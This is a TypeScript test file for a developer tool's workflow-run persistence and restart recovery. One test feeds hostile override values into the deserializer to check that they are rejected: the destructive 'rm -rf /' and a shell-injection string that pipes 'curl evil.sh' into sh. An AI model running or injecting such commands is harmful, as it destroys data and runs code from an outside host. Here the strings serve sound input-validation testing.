import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { canonicalProjectPath } from '../projectPath.js';
import {
  completeWorkflowStep,
  failWorkflowRun,
  restoreWorkflowRun,
} from '../workflowRuns.js';
import { notify, runs, type WorkflowRun } from '../workflowRuns/state.js';
import {
  deserializeWorkflowRuns,
  flushWorkflowRunPersist,
  loadPersistedWorkflowRuns,
  serializeWorkflowRuns,
  workflowRunsFile,
  writeWorkflowRunsNow,
} from '../workflowRuns/persistence.js';
import {
  classifyWorkflowRunResume,
  findStepSessionId,
} from '../workflowRuns/resumeDecision.js';
import { workflowStepDir } from '../workflowRuns/scratchDirectory.js';
import { createWorkflow } from '../workflows.js';

// Regression for: "I ran a workflow, steps 1-4 ran, step 4 was in progress —
// then the workflow status vanished from the navbar and the run stopped."
//
// Root cause: a workflow run lived ONLY in the in-memory `runs` map. The
// backend process is restarted routinely (tsc -w + the dev runner on any
// backend/src change, a crash, a processGuards fail-fast), and `dev.mjs` only
// defers a restart while a per-project run.lock is held — which a workflow
// holds during CONTROL steps and NOT during agent steps. A restart mid-agent-
// step therefore erased the run: /api/workflow-runs/active went empty (the
// vanished chip), and the step's agent — whose pty lives in the DETACHED
// terminal-server and survives the restart — later POSTed /complete into a
// backend that had never heard of the run, where completeWorkflowStep returned
// silently. Every remaining step (Start all open tasks / Merge / Push) never
// ran, with no error surfaced anywhere.
//
// The fix mirrors every running run to
// ~/.lattice/per-project/<hash>/workflow-runs.json and re-adopts it on boot.

function fakeRun(overrides: Partial<WorkflowRun> = {}): WorkflowRun {
  return {
    id: 'wfrun_resume_1',
    workflowId: 'wf-resume',
    workflowName: 'Refactor',
    projectPath: canonicalProjectPath('C:/resume-project'),
    status: 'running',
    startedAt: 1_700_000_000_000,
    totalSteps: 7,
    currentStepIndex: 3,
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// The decision policy
// ---------------------------------------------------------------------------

test('classifyWorkflowRunResume: an agent step whose pty survived is re-adopted', () => {
  const d = classifyWorkflowRunResume({
    status: 'running',
    currentStepIndex: 3,
    definitionStepCount: 7,
    stepKind: 'agent',
    stepSessionAlive: true,
  });
  assert.equal(d.action, 'readopt');
});

test('classifyWorkflowRunResume: an unprobeable terminal-server re-adopts, never errors', () => {
  // `null` means "couldn't ask" — NOT "no sessions". Treating it as gone would
  // let one transient probe failure mass-error every healthy run on the box.
  const d = classifyWorkflowRunResume({
    status: 'running',
    currentStepIndex: 3,
    definitionStepCount: 7,
    stepKind: 'agent',
    stepSessionAlive: null,
  });
  assert.equal(d.action, 'readopt');
});

test('classifyWorkflowRunResume: an agent step whose pty is gone errors instead of hanging', () => {
  const d = classifyWorkflowRunResume({
    status: 'running',
    currentStepIndex: 3,
    definitionStepCount: 7,
    stepKind: 'agent',
    stepSessionAlive: false,
  });
  assert.equal(d.action, 'error');
  assert.match(d.reason, /completion callback can never arrive/);
});

test('classifyWorkflowRunResume: control steps are re-run (they die with the process)', () => {
  for (const kind of ['start', 'merge', 'push'] as const) {
    const d = classifyWorkflowRunResume({
      status: 'running',
      currentStepIndex: 4,
      definitionStepCount: 7,
      stepKind: kind,
      // Control steps never have a pty; the probe result is irrelevant.
      stepSessionAlive: false,
    });
    assert.equal(d.action, 'redispatch', `${kind} must be re-runnable`);
  }
});

test('classifyWorkflowRunResume: a finished run is skipped, a vanished/shrunk definition errors', () => {
  assert.equal(
    classifyWorkflowRunResume({
      status: 'completed',
      currentStepIndex: 6,
      definitionStepCount: 7,
      stepKind: 'agent',
      stepSessionAlive: true,
    }).action,
    'skip',
  );
  assert.equal(
    classifyWorkflowRunResume({
      status: 'running',
      currentStepIndex: 3,
      definitionStepCount: null, // workflow deleted while the run was interrupted
      stepKind: null,
      stepSessionAlive: true,
    }).action,
    'error',
  );
  assert.equal(
    classifyWorkflowRunResume({
      status: 'running',
      currentStepIndex: 9, // the user edited the workflow down to 3 steps
      definitionStepCount: 3,
      stepKind: null,
      stepSessionAlive: true,
    }).action,
    'error',
  );
});

// ---------------------------------------------------------------------------
// Finding the surviving pty
// ---------------------------------------------------------------------------

test('findStepSessionId matches a live pty by its step-dir cwd and ignores junk entries', () => {
  const stepDir = workflowStepDir('C:/resume-project', 'wfrun_x', 3);
  const sessions = [
    null,
    { id: 'tty_other', cwd: 'C:/resume-project' },
    { id: 42, cwd: stepDir }, // non-string id → not usable
    { cwd: stepDir }, // no id
    { id: 'tty_step3', cwd: stepDir },
  ];
  assert.equal(findStepSessionId(sessions as never[], stepDir), 'tty_step3');
  assert.equal(
    findStepSessionId(sessions as never[], workflowStepDir('C:/resume-project', 'wfrun_x', 4)),
    null,
    'a different step index must not match',
  );
  assert.equal(findStepSessionId([], stepDir), null);
});

test('findStepSessionId tolerates separator/case drift in the reported cwd', () => {
  const stepDir = workflowStepDir('C:/resume-project', 'wfrun_x', 2);
  const drifted =
    process.platform === 'win32'
      ? stepDir.replace(/\\/g, '/').toLowerCase()
      : stepDir.replace(/\/+/g, '//');
  assert.equal(findStepSessionId([{ id: 'tty_a', cwd: drifted }], stepDir), 'tty_a');
});

// ---------------------------------------------------------------------------
// The on-disk mirror
// ---------------------------------------------------------------------------

test('workflow-run (de)serialization round-trips and drops unresumable records', () => {
  const run = fakeRun({ harnessOverride: 'pi', piModelOverride: 'openai/gpt-x' });
  const parsed = deserializeWorkflowRuns(JSON.parse(serializeWorkflowRuns([run])));
  assert.deepEqual(parsed, [run]);

  // Only `running` runs are resumable — a finished one has nothing to resume.
  assert.deepEqual(
    deserializeWorkflowRuns({ version: 1, runs: [fakeRun({ status: 'completed' })] }),
    [],
  );
  // Structurally broken records are dropped individually, not fatally.
  assert.deepEqual(
    deserializeWorkflowRuns({
      version: 1,
      runs: [null, 'nope', { id: 'x' }, { ...run, currentStepIndex: -1 }, run],
    }).map((r) => r.id),
    [run.id],
  );
  assert.deepEqual(deserializeWorkflowRuns(undefined), []);
});

test('persisted overrides are re-validated on the way back in (they reach a spawn command)', () => {
  // The mirror is a file on disk: stale, hand-editable, corruptible. Both
  // override fields end up in a harness command, so a bad value must be
  // dropped at this boundary rather than trusted from JSON.
  const [parsed] = deserializeWorkflowRuns({
    version: 1,
    runs: [
      {
        ...fakeRun(),
        harnessOverride: 'rm -rf /',
        piModelOverride: 'openai/gpt-x"; curl evil.sh | sh; #',
      },
    ],
  });
  assert.ok(parsed);
  assert.equal(parsed.harnessOverride, undefined, 'a non-harness value is dropped');
  assert.equal(parsed.piModelOverride, undefined, 'a shell-injecting model is dropped');
});

test('the mirror survives a write/read cycle, clears when nothing runs, and never throws on corruption', async () => {
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfpersist-'));
  try {
    const run = fakeRun({ id: 'wfrun_disk', projectPath: canonicalProjectPath(project) });

    assert.deepEqual(await loadPersistedWorkflowRuns(project), [], 'no file yet → no runs');

    await writeWorkflowRunsNow(project, [run]);
    assert.deepEqual(await loadPersistedWorkflowRuns(project), [run]);

    // A corrupt mirror must degrade to "nothing to resume" rather than throw
    // into boot recovery and abort every later startup phase.
    await fs.writeFile(workflowRunsFile(project), '{"version":1,"runs":[', 'utf8');
    assert.deepEqual(await loadPersistedWorkflowRuns(project), []);

    // No running runs → the file is removed, so boot recovery isn't opening an
    // empty husk for every project that ever ran a workflow.
    await writeWorkflowRunsNow(project, [run]);
    await writeWorkflowRunsNow(project, []);
    await assert.rejects(fs.access(workflowRunsFile(project)));
  } finally {
    await fs.rm(project, { recursive: true, force: true });
  }
});

test('a run-carrying WS event mirrors the project\'s running runs to disk', async () => {
  // The persistence hook lives in `notify`, so every lifecycle event a run
  // emits keeps the mirror current — if it regresses, a restart loses the run
  // again even though the file exists.
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfnotify-'));
  const canonical = canonicalProjectPath(project);
  const run = fakeRun({ id: 'wfrun_notify', projectPath: canonical });
  try {
    runs.set(run.id, run);
    notify({ type: 'progress', run: { ...run } });
    await flushWorkflowRunPersist(canonical);
    assert.deepEqual(
      (await loadPersistedWorkflowRuns(canonical)).map((r) => r.id),
      [run.id],
    );

    // Finishing the run clears it from the mirror — a completed run must not be
    // resurrected as "running" by the next boot.
    run.status = 'completed';
    notify({ type: 'completed', run: { ...run } });
    await flushWorkflowRunPersist(canonical);
    assert.deepEqual(await loadPersistedWorkflowRuns(canonical), []);
  } finally {
    runs.delete(run.id);
    await fs.rm(project, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// The headline behavior: a restored run advances again
// ---------------------------------------------------------------------------

test('a step-completion callback for a run this process never knew is a silent no-op', async () => {
  // This is exactly what the stranded workflow hit: the agent finished, its
  // Stop hook POSTed /complete, and the restarted backend had no run to
  // advance. Nothing threw, nothing was logged as an error, and the remaining
  // steps never ran. Encoded here so the no-op stays the *reason* to restore
  // rather than becoming an accepted outcome.
  await completeWorkflowStep('wfrun_never_existed', 3, 'http://127.0.0.1:5184');
  assert.equal(runs.get('wfrun_never_existed'), undefined);
});

test('restoring a persisted run lets its pending completion callback advance the workflow', async () => {
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfresume-'));
  let canonical = '';
  try {
    const wf = await createWorkflow(project, 'Refactor', [
      { id: 's1', title: 'Refactor', prompt: 'a', mode: 'sequential', harness: 'claude' },
      { id: 's2', title: 'Documentation', prompt: 'b', mode: 'sequential', harness: 'claude' },
    ]);
    canonical = wf.projectPath;

    // A previous backend process mirrored this to disk while step 2 (the last
    // step) was running; that process then died.
    const persisted = fakeRun({
      id: 'wfrun_restored',
      workflowId: wf.id,
      workflowName: wf.name,
      projectPath: wf.projectPath,
      totalSteps: 2,
      currentStepIndex: 1,
    });
    await writeWorkflowRunsNow(wf.projectPath, [persisted]);

    // Fresh process: the run is not in memory, so the pending callback is lost.
    assert.equal(runs.get(persisted.id), undefined);
    await completeWorkflowStep(persisted.id, 1, 'http://127.0.0.1:5184');
    assert.equal(runs.get(persisted.id), undefined, 'no run to advance yet');

    // Boot recovery reads the mirror and re-adopts the run...
    const [fromDisk] = await loadPersistedWorkflowRuns(wf.projectPath);
    assert.ok(fromDisk, 'the interrupted run must survive on disk');
    assert.equal(restoreWorkflowRun(fromDisk), true);
    assert.equal(runs.get(persisted.id)?.status, 'running');
    // ...and restoring is idempotent, so a second recovery pass can't clobber
    // the live run with the stale on-disk snapshot.
    assert.equal(restoreWorkflowRun(fromDisk), false);

    // ...so the still-running agent's Stop hook now advances it. Step 1 is the
    // last step, so the run completes rather than spawning anything.
    await completeWorkflowStep(persisted.id, 1, 'http://127.0.0.1:5184');
    assert.equal(runs.get(persisted.id)?.status, 'completed');

    // And a completed run is dropped from the mirror.
    await flushWorkflowRunPersist(wf.projectPath);
    assert.deepEqual(await loadPersistedWorkflowRuns(wf.projectPath), []);
  } finally {
    for (const [id, r] of [...runs.entries()]) {
      if (r.projectPath === canonical) runs.delete(id);
    }
    await new Promise((r) => setTimeout(r, 200)); // let the workflow store flush
    await fs.rm(project, { recursive: true, force: true });
  }
});

test('failWorkflowRun surfaces an unresumable run instead of leaving it hanging', () => {
  const run = fakeRun({ id: 'wfrun_unresumable' });
  try {
    restoreWorkflowRun(run);
    assert.equal(failWorkflowRun(run.id, 'session did not survive'), true);
    const stored = runs.get(run.id);
    assert.equal(stored?.status, 'errored');
    assert.equal(stored?.error, 'session did not survive');
    assert.ok(stored?.finishedAt);
    // Idempotent: a second recovery pass (or a late callback) can't re-error it.
    assert.equal(failWorkflowRun(run.id, 'again'), false);
    assert.equal(runs.get(run.id)?.error, 'session did not survive');
  } finally {
    runs.delete(run.id);
  }
});
